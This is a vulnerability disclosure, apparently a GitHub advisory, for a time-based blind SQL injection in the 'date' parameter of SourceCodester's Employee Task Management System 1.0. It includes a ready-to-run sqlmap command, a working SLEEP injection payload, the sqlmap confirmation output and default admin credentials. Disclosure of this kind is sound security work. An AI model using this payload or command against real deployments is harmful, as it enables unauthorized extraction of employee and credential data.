# SQL Injection in Employee Task Management System

## Overview

* **Vulnerability Type**: SQL Injection (Time-based Blind)
* **Vendor**: SourceCodester
* **Product**: [Employee Task Management System](https://www.sourcecodester.com/php/15383/employee-task-management-system-phppdo-free-source-code.html)
* **Version**: 1.0
* **Component**: Daily Attendance Report (`daily-attendance-report.php`)
* **Vulnerable Parameter**: `date` (GET)

## Description

A Time-based Blind SQL Injection vulnerability exists in **Employee Task Management System v1.0**. The vulnerability is located in the `daily-attendance-report.php` file.

The application fails to properly sanitize user input supplied to the `date` parameter in a GET request before using it in a SQL query. This allows an authenticated attacker to inject malicious SQL commands. By observing the server's response time (e.g., using `SLEEP()` commands), an attacker can infer data from the database byte-by-byte, leading to unauthorized data exfiltration.

## Steps to Reproduce

1. **Setup**: Deploy the Employee Task Management System locally.
2. **Login**: Log in to the application as an administrator (Default credentials are typically `admin` / `admin`).
3. **Exploit**: Run `sqlmap` against the target URL using the captured cookie and the vulnerable `date` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8085/daily-attendance-report.php?date=51201-02-02" --batch -v 6 --risk=3 --cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Time-Based Blind Payload:**

```sql
date=51201-02-02') AND (SELECT 1850 FROM (SELECT(SLEEP(5)))lFrX) AND ('KypN'='KypN

```

## Proof of Concept

The following output from `sqlmap` confirms that the `date` parameter is vulnerable to Time-based Blind SQL injection:

```text
sqlmap identified the following injection point(s) with a total of 106 HTTP(s) requests:
---
Parameter: date (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: date=51201-02-02') AND (SELECT 1850 FROM (SELECT(SLEEP(5)))lFrX) AND ('KypN'='KypN
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL

```

<img width="1042" height="234" alt="图片" src="https://github.com/user-attachments/assets/6a6489d3-9329-44bc-87d0-122ac265d9b5" />
<img width="1196" height="697" alt="图片" src="https://github.com/user-attachments/assets/bfa5d800-946d-4610-b61c-508d56f4d97e" />


## Impact

This vulnerability allows an authenticated attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the database (e.g., employee records, admin credentials) by inferring data character by character.
2. **Database Enumeration**: Identify database structure, tables, and columns.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/15383/employee-task-management-system-phppdo-free-source-code.html)
